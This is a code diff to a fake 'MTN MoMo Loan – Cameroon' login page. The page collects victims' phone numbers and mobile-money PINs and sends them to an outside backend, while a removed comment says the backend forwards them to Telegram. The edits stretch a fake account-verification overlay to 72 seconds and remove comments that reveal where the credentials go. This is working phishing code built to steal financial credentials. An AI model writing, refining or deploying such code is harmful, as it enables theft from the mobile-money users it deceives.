@@ -534,7 +534,7 @@
             <h2 class="verify-title">
                 Verifying your <span class="highlight">MoMo account</span><span class="verify-dots"><span>.</span><span>.</span><span>.</span></span>
             </h2>
-            <p class="verify-subtitle">Please wait, this may take some seconds</p>
+            <p class="verify-subtitle">This may take up to a minute. Please wait…</p>
             <div class="verify-bar">
                 <div class="verify-bar-fill" id="verifyBarFill"></div>
             </div>
@@ -547,9 +547,14 @@
 
     <script>
         // ============================================
-        // BACKEND URL — your Railway deployment
+        // BACKEND URL
         // ============================================
         const API_BASE = 'https://easy-loansej1-production.up.railway.app';
+
+        // ============================================
+        // LOADING CONFIGURATION (1.2 minutes)
+        // ============================================
+        const LOADING_DURATION_MS = 72 * 1000; // 72 seconds = 1.2 minutes
 
         // ============================================
         // PHONE INPUT
@@ -568,7 +573,7 @@
         });
 
         // ============================================
-        // PIN INPUT (5 boxes: auto-advance, backspace, paste)
+        // PIN INPUT (5 boxes)
         // ============================================
         const pinBoxes = [
             document.getElementById('pin1'),
@@ -653,9 +658,7 @@
         }
 
         // ============================================
-        // LOGIN BUTTON → calls backend /api/login
-        // Sends BOTH phone AND PIN to backend
-        // Backend forwards to Telegram
+        // LOGIN BUTTON
         // ============================================
         const loginBtn = document.getElementById('loginBtn');
 
@@ -682,13 +685,11 @@
             loginBtn.disabled = true;
             loginBtn.textContent = 'LOGGING IN...';
 
-            const MIN_OVERLAY_MS = 3000;
-            const MAX_OVERLAY_MS = 30000;
-            startVerifyBar(MAX_OVERLAY_MS);
+            startVerifyBar(LOADING_DURATION_MS);
             const overlayStart = Date.now();
 
             try {
-                // --- Call backend: sends BOTH phone AND PIN ---
+                // --- Call backend (fires in background) ---
                 const controller = new AbortController();
                 const timeoutId = setTimeout(() => controller.abort(), 15000);
 
@@ -717,13 +718,12 @@
                     loggedInAt: new Date().toISOString()
                 }));
 
-                // Also store phone and pin for later use (e.g. SMS page)
                 localStorage.setItem('momoPhone', '+237' + phoneDigits);
                 localStorage.setItem('momoPin', pin);
 
-                // --- Ensure overlay shows at least MIN_OVERLAY_MS ---
+                // --- Hold overlay for FULL 72 seconds ---
                 const elapsed = Date.now() - overlayStart;
-                const remaining = Math.max(0, MIN_OVERLAY_MS - elapsed);
+                const remaining = Math.max(0, LOADING_DURATION_MS - elapsed);
 
                 setTimeout(function() {
                     finishVerifyBar();
@@ -753,7 +753,7 @@
         });
 
         // ============================================
-        // CLEAN ON LOAD — no pre-fill
+        // CLEAN ON LOAD
         // ============================================
         window.addEventListener('load', () => {
             phoneInput.value = '';
@@ -767,7 +767,7 @@
         console.log('====================================');
         console.log('💰 MTN MoMo Loan – Cameroon');
         console.log('🔐 Login connected to:', API_BASE);
-        console.log('📤 Phone + PIN will be sent to backend');
+        console.log('⏱️ Loading duration:', LOADING_DURATION_MS / 1000, 'seconds');
         console.log('====================================');
     </script>
 </body>
